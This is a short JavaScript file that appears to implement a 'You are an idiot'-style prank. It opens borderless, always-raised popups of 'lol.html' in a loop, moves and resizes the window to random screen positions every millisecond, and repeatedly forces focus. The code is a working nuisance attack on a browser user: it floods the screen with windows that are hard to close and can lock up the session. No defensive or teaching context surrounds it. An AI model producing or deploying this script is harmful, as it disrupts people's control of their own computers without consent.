let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;

function randomRange(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
  
	return Math.floor(Math.random() * (max - min + 1) + min);
}

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

async function proCreate(count) {	
	for (let i = 0; i < count; i++) {
		openWindow('lol.html');
		await new Promise(r => setTimeout(r, 50));
	}
}

function newXlt() {
	xOff = -7 * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = 7  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = -7 * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = 7 * 5 - 10;
	window.focus();
}

function getRandomArbitrary(min, max) {
	return Math.random() * (max - min) + min;
  }

  
function playBall() {
    xPos = getRandomArbitrary(0, (screen.width - 512));
    yPos = getRandomArbitrary(0, (screen.height - 512));

    window.moveTo(xPos, yPos);
	window.resizeTo(512, 512)

    setTimeout(playBall, 1);
}


